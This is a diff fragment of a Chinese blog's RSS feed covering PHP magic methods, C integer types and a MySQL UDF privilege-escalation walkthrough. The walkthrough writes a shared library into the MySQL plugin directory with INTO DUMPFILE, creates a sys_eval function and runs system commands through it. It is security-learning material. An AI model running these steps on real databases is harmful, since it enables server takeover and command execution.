+					&lt;td&gt;PHP 7.4+ 引入。反序列化后触发，优先级高于 &lt;code&gt;__wakeup&lt;/code&gt;。用于恢复对象状态。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__set_state()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;当使用 &lt;code&gt;var_export()&lt;/code&gt; 导出类时触发。必须是静态方法，返回类实例。&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td&gt;&lt;strong&gt;&lt;code&gt;__debugInfo()&lt;/code&gt;&lt;/strong&gt;&lt;/td&gt;
+					&lt;td&gt;当使用 &lt;code&gt;var_dump()&lt;/code&gt; 打印对象信息时触发，用于控制显示的属性。&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;1、 &lt;code&gt;__construct()&lt;/code&gt; 和 &lt;code&gt;__destruct()&lt;/code&gt;&lt;/p&gt;</description>
     </item>
@@ -862,7 +1147,27 @@ Windows (IIS)	C:\inetpub\wwwroot\
 Windows (XAMPP)	C:\xampp\htdocs\
 Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
 &lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;漏洞复现&#34;&gt;漏洞复现&lt;/h3&gt;
-&lt;p&gt;方法一: &amp;ndash;os-shell&lt;/p&gt;</description>
+&lt;p&gt;方法一: &amp;ndash;os-shell&lt;/p&gt;
+&lt;p&gt;方法二: 手动构造&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;1. -- 查看架构（确定是 Windows/Linux 及 x64/x86）
+show variables like &amp;#39;%compile%&amp;#39;; 
+
+2. -- 查看插件存放目录
+show variables like &amp;#39;plugin_dir&amp;#39;;
+
+3. 准备udf文件: https://www.sqlsec.com/udf/
+
+4. 将文件写入插件目录(最好DUMPFILE,outfile也能写但是不处理换行符)
+SELECT 0x7f45... INTO DUMPFILE &amp;#39;/usr/lib/mysql/plugin/udf.so&amp;#39;;
+
+5. 创建关联函数
+-- 创建名为 sys_eval 的函数，关联到刚才上传的库文件
+CREATE FUNCTION sys_eval RETURNS STRING SONAME &amp;#39;udf.so&amp;#39;;
+
+6.执行系统命令
+SELECT sys_eval(&amp;#39;whoami&amp;#39;);
+&lt;/code&gt;&lt;/pre&gt;&lt;/li&gt;
+&lt;/ul&gt;</description>
     </item>
     <item>
       <title></title>
@@ -879,60 +1184,60 @@ Windows (phpStudy)	D:\phpstudy_pro\WWW\, C:\phpStudy\WWW\
 &lt;/ul&gt;
 &lt;h3 id=&#34;整数类型&#34;&gt;整数类型&lt;/h3&gt;
 &lt;table&gt;
-  &lt;thead&gt;
-      &lt;tr&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;类型&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;存储大小&lt;/th&gt;
-          &lt;th style=&#34;text-align: left&#34;&gt;值范围&lt;/th&gt;
-      &lt;/tr&gt;
-  &lt;/thead&gt;
-  &lt;tbody&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;char&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;-128 到 127 或 0 到 255&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;unsigned char&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;0 到 255&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;signed char&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;-128 到 127&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;int&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;2 或 4 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;unsigned int&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;2 或 4 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;0 到 65,535 或 0 到 4,294,967,295&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;short&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;2 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;-32,768 到 32,767&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;unsigned short&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;2 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;0 到 65,535&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;long&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;4 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;-2,147,483,648 到 2,147,483,647&lt;/td&gt;
-      &lt;/tr&gt;
-      &lt;tr&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;unsigned long&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;4 字节&lt;/td&gt;
-          &lt;td style=&#34;text-align: left&#34;&gt;0 到 4,294,967,295&lt;/td&gt;
-      &lt;/tr&gt;
-  &lt;/tbody&gt;
+	&lt;thead&gt;
+			&lt;tr&gt;
+					&lt;th style=&#34;text-align: left&#34;&gt;类型&lt;/th&gt;
+					&lt;th style=&#34;text-align: left&#34;&gt;存储大小&lt;/th&gt;
+					&lt;th style=&#34;text-align: left&#34;&gt;值范围&lt;/th&gt;
+			&lt;/tr&gt;
+	&lt;/thead&gt;
+	&lt;tbody&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;char&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;-128 到 127 或 0 到 255&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;unsigned char&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;0 到 255&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;signed char&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;1 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;-128 到 127&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;int&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;2 或 4 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;-32,768 到 32,767 或 -2,147,483,648 到 2,147,483,647&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;unsigned int&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;2 或 4 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;0 到 65,535 或 0 到 4,294,967,295&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;short&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;2 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;-32,768 到 32,767&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;unsigned short&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;2 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;0 到 65,535&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;long&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;4 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;-2,147,483,648 到 2,147,483,647&lt;/td&gt;
+			&lt;/tr&gt;
+			&lt;tr&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;unsigned long&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;4 字节&lt;/td&gt;
+					&lt;td style=&#34;text-align: left&#34;&gt;0 到 4,294,967,295&lt;/td&gt;
+			&lt;/tr&gt;
+	&lt;/tbody&gt;
 &lt;/table&gt;
 &lt;p&gt;一个demo:&lt;/p&gt;</description>
     </item>
